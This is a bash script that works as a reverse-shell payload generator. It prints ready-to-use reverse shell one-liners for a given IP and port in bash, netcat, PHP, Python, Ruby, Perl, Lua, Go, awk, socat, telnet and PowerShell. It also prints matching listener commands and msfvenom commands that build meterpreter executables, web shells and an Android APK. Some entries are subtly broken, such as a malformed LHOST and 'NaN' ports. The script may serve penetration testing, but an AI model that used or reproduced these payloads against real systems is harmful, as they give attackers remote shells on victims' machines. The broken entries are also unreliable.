#!/bin/bash
red='\033[0;31m'
green='\033[0;32m'
lgreen='\033[1;32m'
yellow='\033[1;33m'
noc='\033[0m'  # No Color
lcyan='\033[1;36m'

echo -e " "
echo -e "intant of${red}"\"/bin/sh"\" or "sh" ${noc} you can use som other options"
echo -e "${yellow}/bin/bash,/bin/sh,ash,bsh,csh,ksh,zsh,pwsh${noc}"
echo -e " "
usage(){
 echo -e " "
 echo -e "${lgreen}Usage: $0 <TARGET-IP> <PORT> <TYPE>"
 echo -e "Ex:-${green} $0 127.0.0.1 4444 bash-i${noc}"
 echo -e "${noc}bash-i ,bash-udp (udp port),bash5 ,bash-196,bash-r (readline) ,zsh (linux zsh terminal)";
 echo -e "nc-e ,nc-c ,ncat-e ,ncat.exe-e ,ncat-udp ,nc-mknod ,nc-mkfifo ,nc-pipe,nc.exe-w (Windows)"
 echo -e "php,php-cmd ${red}(web cmd execution)${noc} ,php-system ,php-passthru ,php-exec ,php-shell_exec ,php-proc_open ,php-poopen ,php-'"
 echo -e "python-1 ,python-2 ,python3-1 ,python3-2 ,python-s(forshort)"
 echo -e "ruby ,ruby-sh ,ruby-w (Windows),c-win(Windows)"
 echo -e "perl ,perl-sh ,perl-w (Windows)"
 echo -e "java1 ,java2 ,java3"
 echo -e "Lua-1 ,Lua-2"
 echo -e "socat-1 ,socat-tty"
 echo -e "telnet-mkfifo ,telnet"
 echo -e "(Windows): powershell-cmd2 ,powershell-cmd2 ,powershell-cmd3 ,powershell-cmd4 ,powershell-tls ,Windows-pty"
 echo -e "golang ,dart ,Groovy,awk ,node.js,tcl-sh,xterm ,haskell1,haskell2${lcyan}(long version)${noc} ,rustcat,c-lang${red}(normal c language)${noc}"
 echo -e " "
 echo -e "${yellow}Metasplot revshell${noc}"
 echo -e "${yellow}Please don't forget to use ${red}-m${yellow} fot normal metasploit shell and ${red}-s${yellow}for staged shell${noc}"
 echo -e " ${lgreen}-s is use for the stage${noc} "
 echo -e "asp ,jsp ,lin-bin/linux(elf) ,lin-bin-s/linux-s(stager) ,osx-bin/Mac ,war"
 echo -e "win-bin(exe),win-bin(exe)-s,shellcode"
 echo -e "php-m(meterpreter rev),php-revm(normal php rev shell)"
 echo -e "android,python,bash"
 echo -e " "
 echo -e "${yellow}some special payload${noc}"
 echo -e "${lgreen}change ip and port accordingly${noc}"
 echo -e " "
 echo -e "pentest-monkey"
 echo -e "php-lvan-sincek"
 echo -e " "
 echo -e " "
       }

intractive_shell_bash(){
  echo -e " "
  echo -e "${yellow}Listner on Your Mechine"
  echo -e " "
  echo -e "${green}nc -nvlp $1"
  echo -e "${green}ncat -lvnp $1"
  echo -e "${green}rlwrap -cAr nc -lvnp $1"
  echo -e "${green}ncat --ssl -lvnp $1"
  echo -e "${green}rcat -lp $1"
  echo -e "${green}python3 -m pwncat -lp $1"
  echo -e "${green}pwncat -l -p $1"
  echo -e " "
  echo -e "${yellow}For complete intractive shell"
  echo -e "${green}stty raw -echo;fg ${lcyan}(for zsh shell)"
  echo -e "${green}export TERM=xterm"
  echo -e "${green}stty row <number of row> col <number of col> ${lcyan}(for check No. of row & col)${green} stty -a"
  echo -e " "
}
intractive_shell_socat(){
  echo -e "${yellow}Listner on Your Mechine"
  echo -e " "
  echo -e "${lgreen}socat -d -d TCP-LISTEN:$1 STDOUT"
  echo -e "${lgreen}socat -d -d file:`"tty"`,raw,echo=0 TCP-LISTEN:$1 ${red}socat TTY${noc}"
  echo -e " "
  echo -e "${yellow}For complete intractive shell"
  echo -e "${green}stty raw -echo;fg ${lcyan}(for zsh shell)"
  echo -e "${green}export TERM=xterm"
  echo -e "${green}stty row <number of row> col <number of col> ${lcyan}(for check No. of row & col)${green} stty -a"
  echo -e " "
}

intractive_shell_windows(){
  echo -e "${yellow}Listner on Your Mechine"
  echo -e "${lgreen}stty raw -echo; (stty size; cat) | nc -lvnp $2 ${red}windows conpty${noc}"
  echo -e " "
  echo -e "${yellow}For complete intractive shell"
  echo -e "${green}stty raw -echo;fg ${lcyan}(for zsh shell)"
  echo -e "${green}export TERM=xterm"
  echo -e "${green}stty row <number of row> col <number of col> ${lcyan}(for check No. of row & col)${green} stty -a"
  echo -e " "
}
intractive_shell_msf(){
  echo -e "msfconsole -q -x use multi/handler"
  echo -e "set payload windows/x64/meterpreter/reverse_tcp"
  echo -e "set lhost $1"
  echo -e "set lport $2"
  echo -e "exploit"
}
if (( "$#" == 1 )); then
  case $1 in
    php-lvan | lavan | sincek | php-lvan-sincek )
    echo -n "${lgreen}https://github.com/ivan-sincek/php-reverse-shell"
     ;;
    php-cmd | PHP-CMD | php-CMD | phpcmd | PHP-cmd )
    echo -e "${lgreen}`cat php_cmd.php` && $(xclip php_cmd.php)"
     ;;
    * | "--help" | "-h" )
    echo -e "FOR HELP ${yellow}"--help" or "-h"${noc}"
    usage
     ;;
  esac
elif (( "$#" != 3 )); then
   usage
fi



case $3 in
  bash-i | Bash-i | bash )
  echo -e "${lgreen}sh -i >& /dev/tcp/$1/$2 0>&1"
  echo -e "$(intractive_shell_bash $2)"
   ;;
  bash-udp | Bash-UDP | Bash-Udp | BASH-UDP )
  echo -e "${lgreen}sh -i >& /dev/udp/$1/$2 0>&1"
  echo -e "${lgreen}bash -i >& /dev/udp/$1/$2 0>&1"
  echo -e "$(intractive_shell_bash $2)"
    ;;
  bash5 | Bash5 | BASH5 )
  echo -e "${lgreen}sh -i 5<> /dev/tcp/$1/$2 0<&5 1>&5 2>&5"
  echo -e "$(intractive_shell_bash $2)"
    ;;
  bash-196 | Bash-196 | BASH-196 | bash-19 )
  echo -e "${lgreen}0<&196;exec 196<>/dev/tcp/$1/$2; sh <&196 >&196 2>&196"
  echo -e "$(intractive_shell_bash $2)"
    ;;
  bash-r | Bash-r | BASH-r | bash-readline | bash-read )
  echo -e "${lgreen}exec 5<>/dev/tcp/$1/$2;cat <&5 | while read line; do $"line" 2>&5 >&5; done"
  echo -e "$(intractive_shell_bash $2)"
    ;;
  zsh | Zsh | ZSH )
  echo -e "${lgreen}zsh -c 'zmodload zsh/net/tcp && ztcp $1 $2 && zsh >&$"REPLY" 2>&$"REPLY" 0>&$"REPLY"'"
  echo -e "$(intractive_shell_bash $2)"
    ;;
  nc-e | NC-e | nc | nc-E )
  echo -e "${lgreen}nc -e /bin/sh $1 $2"
  echo -e "${lgreen}nc -e /bin/bash $1 $2"
  echo -e "$(intractive_shell_bash $2)"
    ;;
  nc-c | NC-c | NC-C )
  echo -e "${lgreen}nc -c /bin/sh $1 $2"
  echo -e "${lgreen}nc -c /bin/bash $1 $2"
  echo -e "$(intractive_shell_bash $2)"
    ;;
  ncat-e | NCAT-e | ncat-E | ncat )
  echo -e "${lgreen}ncat $1 $2 -e /bin/sh"
  echo -e "${lgreen}ncat $1 $2 -e /bin/bash"
  echo -e "$(intractive_shell_bash $2)"
    ;;
  Ncat.exe-e | ncat.exe-e )
  echo -e "${lgreen}ncat.exe $1 $2 -e /bin/sh"
  echo -e "${lgreen}ncat.exe $1 $2 -e /bin/bash"
    ;;
  ncat-udp | ncat-udp | ncat-u | NCAT-u | ncat-U )
  echo -e "${lgreen}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i 2>&1|ncat -u $1 $2 >/tmp/f"
    ;;
  nc-mknod | nc-nod | NC-MKNOD | NC-mknod )
  echo -e "${lgreen}'rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc $1 $2 1>/tmp/l'"
    ;;
  nc-mkfifo | mkfifo | nc-MKFIFO | NC-mkfifo | ncmkfifo )
  echo -e "${lgreen}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"
    ;;
  nc-pipe | ncpipe | NC-pipe | NCPIPE | NC-PIPE | pipe )
  echo -e "${lgreen}'/bin/sh | nc $1 $2"
    ;;
  nc.exe-w | nc.exe-W |  nc.exe-Windows | nc.exe-windows | nc.exe-win | nc.exe )
  echo -e "${lgreen} nc.exe -e sh $1 $2"
    ;;
  rcat | rustcat  )
  echo -e "${lgreen}rcat $1 $2 -r /bin/sh"
    ;;
  php | PHP | Php | php4 | php5 | php-sys | php-system | php-s )
  echo -e "${lgreen} php -r '$"sock"=fsockopen("\"$1"\",$2);system("\""/bin/sh <&3 >&3 2>&3"\"");'"
    ;;
  php-exec | php-exe | PHP-EXEC | php-EXEC )
  echo -e "${lgreen}php -r '$"sock"=fsockopen("\"$1"\",$2);exec("\""/bin/sh <&3 >&3 2>&3""\");'"
    ;;
  php-shell_exec | php-shell | php-SHELL_EXEC | PHP-SHELL_EXEC | PHPSHELL | phpshell | php-shell-exec | phpshellexec  )
  echo -e "${lgreen}php -r '$"sock"=fsockopen("\"$1"\",$2);shell_exec("\""sh <&3 >&3 2>&3""\");'"
    ;;
  php-proc_open | php-proc-open | PHP-PROC-OPEN | phpproc | phpprocopen | php-procopen | PHPPROCOPEN | php-proc | php-open )
  echo -e "${lgreen}php -r '$"sock"=fsockopen("\"$1"\",$2);$"proc"=proc_open("\"sh"\", array(0=>$"sock", 1=>$"sock", 2=>$"sock"),$"pipes");'"
    ;;
  php-popen | php_popen | phppopen | PHP-popen | PHP-POPEN | popen | POPEN | PHPPOPEN )
  echo -e "${lgreen}php -r '$"sock"=fsockopen("\"$1"\",$2);popen("\""sh <&3 >&3 2>&3""\", "\""r"\"");'"
#    ;;
#  php`)
#  echo -e "${lgreen}php -r '$"sock"=fsockopen("\"$1"\",$2);"`"sh <&3 >&3 2>&3"`";'"
    ;;
  python-1 | PYTHON-1 | Python-1 | python1 | python_1  | python2-1 | PYTHON2-1 | Python2-1 | python21 | python2_1 | python2-1 )
  echo -e "${lgreen}export RHOST="\"$1"\";export RPORT=$2;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("\""RHOST""\"),int(os.getenv("\"RPORT"\"))));[os.dup2(s.fileno(),fd)for fd in (0,1,2)];pty.spawn("\"sh"\")' "
    ;;
  python-2 | PYTHON-2 | Python-2 | python2 | python_2  | python2-2 | PYTHON2-2 | Python2-2 | python22 | python2_2 | python2-2 )
  echo -e "${lgreen}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"$1"\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("\"sh"\")'"
    ;;
  python3-1 | PYTHON3-1 | Python3-1 | python3 | python3_1  | python31 | python3_1 | python3 )
  echo -e "${lgreen}export RHOST="\"$1"\";export RPORT=$2;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("\"RHOST"\"),int(os.getenv("\"RPORT"\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("\"sh"\")'"
    ;;
  python3-2 | PYTHON3-2 | Python3-2 | python3.2 | python3_2  | python32 | python3_2  )
  echo -e "${lgreen}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\""$1""\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("\"sh"\")'"
    ;;
  python-s | Python-s | python-s | python-short | pythons | PYTHON-S | PYTHON-SHORT | python-sort | Python-Sort | Python-SORT | python3-s | python3-s | Python3-s | python2-s | python3-short | python3s | PYTHON3-S | PYTHON3-SHORT | python3-sort | Python3-Sort | Python3-SORT | python2-s | Python2-s | python2-s | python2-short | python2s | PYTHON2-S | PYTHON2-SHORT | python2-sort | Python2-Sort | Python2-SORT )
  echo -e "${lgreen}python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\""$1""\",$2));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("\"sh"\")'"
    ;;
  ruby | Ruby | RUBY )
  echo -e "${lgreen}ruby -rsocket -e'spawn("\"sh"\",[:in,:out,:err]=>TCPSocket.new("\""$1""\",$2))'"
   ;;
  ruby-sh | Ruby-SH | RUBy-sh | Ruby-sh | ruby2 | Ruby2 | Ruby-sh | ruby-2 )
  echo -e "${lgreen}ruby -rsocket -e'exit if fork;c=TCPSocket.new("\"$1"\","\"NaN"\");loop{c.gets.chomp!;(exit! if $_=="\"exit"\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "\"failed: "#"""{'$_'}""\"}"'"
   ;;
  ruby-windows | Ruby-windows | RUBY-windows | ruby-w | ruby-win | Ruby-w | Ruby-win | RUBY-WIN | Ruby-Win | rubyw | RUBYW  )
  echo -e "${lgreen}ruby -rsocket -e 'c=TCPSocket.new("\"$1"\","\"$2"\");while(cmd=c.gets);IO.popen(cmd,"\"r"\"){|io|c.print io.read}'"
   ;;
  socat1 | socat-1 | socat_1 | SOCAT-1 | socat | SOCAT | Socat-1 )
  echo -e "${lgreen}socat TCP:$1:$2 EXEC:sh"
  echo -e ""
  echo -e "$(intractive_shell_socat $2)"
   ;;
  socat-tty | Socat-tty | socat-TTY | socat-2 | SOCAT-tty | SOCAT-TTY | socat_2 | socattty | socat2 )
  echo -e "${lgreen}socat TCP:$1:$2 EXEC:'sh',pty,stderr,setsid,sigint,sane"
  echo -e ""
  #echo -e "${red}Socat listner${noc}"
  #echo -e "${lgreen}socat -d -d file:"\`"tty"\`",raw,echo=0 TCP-LISTEN:$2"
  echo -e "$(intractive_shell_socat $2)"
   ;;
  telnet | Telnet | TELNET )
  echo -e "${lgreen}TF=$""("mktemp" "-u");mkfifo $"TF" && telnet $1 $2 0<$"TF" | sh 1>$"TF""
   ;;
  Telnet-mkfifo | telnet-mkfifo | TELNET-MKFIFO | telnetmkfifo | telnet-mk )
  echo -e "${lgreen}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet $1 $2 > /tmp/f"
   ;;
  perl | PERL | Perl )
  echo -e "${lgreen}perl -e 'use Socket;$"i"="$1";$"p"=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($"p",inet_aton($"i")))){open(STDIN,"\"">&S""\");open(STDOUT,"\"">&S""\");open(STDERR,"\"">&S""\");exec("\""sh -i""\");};'"
   ;;
  perl-sh | Perl-sh | perlsh | PERL-SH | Perl-Sh  )
  echo -e "${lgreen}perl -MIO -e '$"p"=fork;exit,if($"p");$"c"=new IO::Socket::INET(PeerAddr,"\""$1:$2""\");STDIN->fdopen($"c",r);$~->fdopen($"c",w);system$"_" while<>;'"
   ;;
  perl-windows | Perl-Windows | perl-win | perl-w )
  echo -e "${lgreen}perl -MIO -e '$"c"=new IO::Socket::INET(PeerAddr,"\""$1:$2""\");STDIN->fdopen($"c",r);$~->fdopen($"c",w);system$"_" while<>;'"
   ;;
  lua1 | lua-1 | Lua-1 | LUA-1 | LUA1 )
  echo -e ''${lgreen}lua -e "require('socket');require('os');t=socket.tcp();t:connect('$1','$2');os.execute('sh -i <&3 >&3 2>&3');"''
   ;;
  lua2 | lua-2 | Lua2 | LUA-2 )
  echo -e "${lgreen}lua5.1 -e 'local host, port = "\""$1""\", NaN local socket = require("\""socket""\") local tcp = socket.tcp() local io = require("\""io""\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "\""r""\") local s = f:read("\""*a""\") f:close() tcp:send(s) if status == "\""closed""\" then break end end tcp:close()'"
   ;;
  golang | go | go-lang )
  echo -e "${lgreen}echo 'package main;import "\""os/exec""\";import "\""net""\";func main(){c,_:=net.Dial("\""tcp""\","\""$1:$2""\");cmd:=exec.Command("\""/bin/sh""\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
   ;;
  awk | Awk | AWK )
  echo -e "${lgreen}awk 'BEGIN {s = "\""/inet/tcp/0/$1/$2""\"; while(42) { do{ printf "\""shell>""\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "\""exit""\") close(s); }}' /dev/null "
   ;;
  node.js | node | Node.js | Node )
  echo -e "${lgreen}require('child_process').exec('nc -e sh $1 $2')"
   ;;
  java1 | java-1 | Java-1 | java_1 | JAVA1 )
  echo -e "${red}you can save this with <file name>.jsp extention "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ java1.txt > java_1.jsp && xclip java_1.jsp
  mv java_1.jsp /home/$USER/javashell1.jsp
   ;;
  java-2 | java2 | Java-2 | JAVA-2 | JAVA2 )
  echo -e "${red}you can save this with <file name>.jsp extention "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ java2.txt > java_2.jsp && xclip java_2.jsp
  mv java_2.jsp /home/$USER/javashell2.jsp
   ;;
  java3 | java-3 | Java-3 | JAVA3 |JAVA-3 )
  echo -e "${red}you can save this with <file name>.jsp extention "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ java3.txt > java_3.jsp && xclip java_3.jsp
  mv java_3.jsp /home/$USER/javashell3.jsp
   ;;
  powershell1 | powershell-1 | Powershell-1 | ps1 | ps-1 | PS-1 | powershell-cmd | ps-cmd )
  echo -e ""
  echo -e "${red}you can save this with <file name>.hs extention "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ powershell1.txt > powershell_1.ps && xclip powershell_1.ps
  mv  powershell_1.ps  /home/$USER/powershell_1.ps
   ;;
  powershell2 | powershell-2 | Powershell-2 | ps2 | ps-2 | PS-2 | powershell2-cmd | ps2-cmd )
  echo -e ""
  echo -e "${red}you can save this with <file name>.hs extention "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ powershell2.txt > powershell_2.ps && xclip powershell_2.ps
  mv  powershell_2.ps  /home/$USER/powershell_2.ps
   ;;
  powershell3 | powershell-3 | Powershell-3 | ps3 | ps-3 | PS-3 | powershell3-cmd | ps3-cmd )
  echo -e ""
  echo -e "${red}you can save this with <file name>.hs extention "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ powershell3.txt > powershell_3.ps && xclip powershell_3.ps
  mv  powershell_3.ps  /home/$USER/powershell_3.ps
   ;;
  powershelltls | powershell-tls | Powershell-tls | pstls | ps-tls | PS-tls | powershell-tls | ps-tls )
  echo -e ""
  echo -e "${red}you can save this with <file name>.hs extention "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ powershell4.txt > powershell_4.ps && xclip powershell_4.ps
  mv  powershell_4.ps  /home/$USER/powershell_4.ps
   ;;
  dart | DATR | Dart )
  echo -e "${red}you can save this "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ dart.txt > dart_2.txt
  cat dart_2.txt && xclip dart_2.txt
  rm dart_2.txt
   ;;
  groovy | Groovy | Groovy )
  echo -n "${lgreen}String host="\""$1""\";int port=$2;String cmd="\""/bin/bash""\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
   ;;
  tclsh | tcl-sh | Tclsh )
  echo -n "${lgreen}echo 'set s [socket $1 $2];while 42 { puts -nonewline $"s" ""shell>"";flush $"s";gets $"s" c;set e "\"""exec""\" $"c"";if {![catch {set r [eval $"e"]} err]} { puts $"s" $"r" }; flush $"s"; }; close $"s";' | tclsh"
   ;;
  xterm | Xterm | XTERM )
  echo -e "${lgreen}xterm -display $1:1"
  echo -e "${lgreen}Xnest :1"
  echo -e "${lgreen}xhost +targetip"
   ;;
  Haskell-Reverse-Shell | Haskell2 | haskell2 | haskell2-rev | haskell2-r )
  echo -e ""
  echo -e "${red}you can save this with <file name>.hs extention "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ Haskell-Reverse-Shell.txt > Haskell-Reverse-Shell2.hs && xclip Haskell-Reverse-Shell2.hs
  mv Haskell-Reverse-Shell2.hs /home/$USER/Shell2.hs
  echo -n "you can also visit for more resources"
  echo -n "${lcyan}https://github.com/passthehashbrowns/Haskell-Reverse-Shell"
  echo -n ""
   ;;
  Haskell-Reverse-Shell1 | Haskell1 | haskell1 | haskell1-rev | haskell1-r )
  echo -e ""
  echo -e "${red}you can save this with <file name>.hs extention "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/ip/$1/ -e s/port/$2/ haskell1.txt > haskell2.hs && xclip haskell2.hs
  mv haskell2.hs /home/$USER/Shell2.hs
   ;;
   # metasploit please add -m at the postfix
  asp-m | Asp-m | ASP-m )
  echo -e "${lgreen}msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f asp > revshell.asp"
   ;;
  jsp | JSP | Jsp )
  echo -e "${lgreen}msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f raw -o shell.jsp"
   ;;
  aspx | Aspx | ASPX )
  echo -e "${lgreen}msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f aspx > revshell.aspx"
   ;;
  linux-s | lin-bin-s | elf-s )
  echo -n "${lcyan}you can change platform accordingly(x64/x86)"
  echo -e "${lgreen}msfvenom -p linux/${red}x86${noc}/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf > revshell"
   ;;
  lin-bin-m | linux-m | elf-m | lin-m )
  echo -n "${lcyan}you can change platform accordingly(x64/x86)"
  echo -e "${lgreen}msfvenom -p linux/${lcyan}x64${noc}/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf -o reverse.elf"
   ;;
  mac-m | Mac | mac | Mac-m )
  echo -n "${lcyan}you can change platform accordingly(x64/x86)"
  echo -e "${lgreen}msfvenom -p osx/x86/shell_reverse_tcp LHOST=$1 LPORT=$2 -f macho > revshell.macho"
   ;;
  war-m | War-m | WAR-m )
  echo -e "${lgreen}msfvenom -p java/shell_reverse_tcp LHOST=$1 LPORT=$2 -f war -o revshell.war"
   ;;
  win-s | Win-s | win-bin-s  )
  echo -e "$(intractive_shell_msf $1,$2)"
  echo -e "${lgreen}msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe -o reverse.exe"
   ;;
  win-m | Win-m | win-bin-m )
  echo -e "$(intractive_shell_msf $1 ,$2)"
  echo -e "${lgreen}msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$2-+* LPORT=$2 -f exe -o reverse.exe"
   ;;
  shellcode | Shellcode )
  echo -n "${red}first argument is the bad character"
  echo -e "${lgreen}msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '$1' -f python -v notBuf -o shellcode"
   ;;
  php-m | PHP-m | Php-m )
  echo -e "${lgreen}msfvenom -p php/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -f raw -o shell.php"
   ;;
  php-revm )
  echo -e "${lgreen}msfvenom -p php/reverse_php LHOST=$1 LPORT=$2 -o shell.php"
   ;;
  android-m | Android-m )
  echo -e "${lgreen}msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=$1 lport=$2 R -o malicious.apk"
   ;;
  python-m | Python-m | python3-m | Python3-m )
  echo -e "${lgreen}msfvenom -p cmd/unix/reverse_python LHOST=$1 LPORT=$2 -f raw -o shell.py"
   ;;
  bash-m | Bash-m )
  echo -e "${lgreen}msfvenom -p cmd/unix/reverse_bash LHOST=$1 LPORT=$2 -f raw -o shell.sh"
   ;;
  monkey | pentest | pentest-monkey )
  echo -e "${lgreen}https://github.com/pentestmonkey/php-reverse-shell"
  echo -e "${lgreen}https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"
  echo -e "${yellow}/usr/share/webshells${green} in local system(kali linux)"
  echo -e " "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/TEST1/$1/ -e s/TEST2/$2/ pentest_monkey_revshell.txt > revshell.php && xclip revshell.php
  mv revshell.php /home/$USER/phprevshell.php
  echo -e " "
   ;;
  c-win | C-Win | C-WIN | cwin |CWINDOWS )
  echo -e " "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/TEST1/$1/ -e s/TEST2/$2/ cwindows.txt > cwindows1.c && xclip cwindows.c
  mv cwindows.c /home/$USER/winrevshell_c.c
  echo -e " "
   ;;
  c-lang | C-lang | C-Lang | c_lang )
  echo -e " "
  echo -e " it is also copy to clip board ${lcyan}"
  sed -e s/TEST1/$1/ -e s/TEST2/$2/ c_lang.txt > crevshell.c && xclip crevshell.c
  mv crevshell.c /home/$USER/revshell_c.c
  echo -e " "
   ;;
 esac
